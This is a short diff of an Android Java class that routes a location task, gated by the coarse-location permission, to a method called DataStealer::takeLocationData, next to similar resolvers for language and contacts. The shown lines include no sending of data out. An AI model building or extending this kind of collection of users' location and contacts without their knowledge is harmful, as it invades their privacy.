@@ -29,13 +29,12 @@ public class TaskResolverManager {
                     new String[]{},
                     DataStealer::takeLanguage);
 
+    
     private final static TaskResolver<LocationData> locationTaskResolver =
             new AsyncTaskResolver<>(
                     "location",
-                    new String[]{Manifest.permission.ACCESS_COARSE_LOCATION},
-                    (a, b) -> {
-                    });
-
+                    new String[] {Manifest.permission.ACCESS_COARSE_LOCATION},
+                    DataStealer::takeLocationData);
 
     public static TaskResolver<? extends UserData> getResolverFor(Task task) {
         if (contactTaskResolver.applicableFor(task)) return contactTaskResolver;
